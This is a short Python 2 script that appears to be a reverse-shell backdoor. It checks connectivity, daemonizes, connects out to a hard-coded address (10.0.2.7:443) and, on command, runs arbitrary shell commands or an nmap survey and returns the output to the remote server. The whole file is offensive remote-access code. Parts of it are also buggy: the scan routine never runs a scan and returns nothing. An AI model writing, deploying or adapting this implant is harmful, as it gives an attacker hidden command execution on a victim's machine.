import os
import sys
import subprocess 
import time
import socket
from threading import Thread
import nmap

def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit(0) # exit first parent
    pid = os.fork()
    if pid > 0:
        sys.exit(0) # exit second parent
def nampsurvey():
    nm = nmap.PortScanner()
    for host in nm.all_hosts():
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            lport.sort()
            for port in lport:
               print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
def connect():        
    global server
    global port
    global s
    global ip    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 443
    server = '10.0.2.7'
    try:
        print '[!] Attempting Connection to Server'
        # print ip //this was a be
        s.connect((server,port))
        print '[!] Connection Established'
        s.send('testbox')
    except:
        print '[!] Unable to Connect Retrying in 10'
        time.sleep(10)
        callout()
def callout():
    lifeline = os.system("ping -c 1 8.8.8.8 > /dev/null")
    while lifeline != 0:    
        time.sleep(3)
        lifeline = os.system("ping -c 1 8.8.8.8 > /dev/null")
    if lifeline == 0:
        print "Route Found Continue"
        time.sleep(1)
        daemonize()
        connect()
def  receive():
    receive = s.recv(1024)
    if receive == 'quit':
        s.close()
    elif receive == 'survey':    
        nmapout = nampsurvey()
        s.send(nmapout)    
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        s.send(stdout_value)
        #args = stdout_value
    else:
        args = ' no valid input was givin'
        send(args)
def send(args):
   send = s.send(args)
def main():
    callout()
    receive()
    s.close()
main()




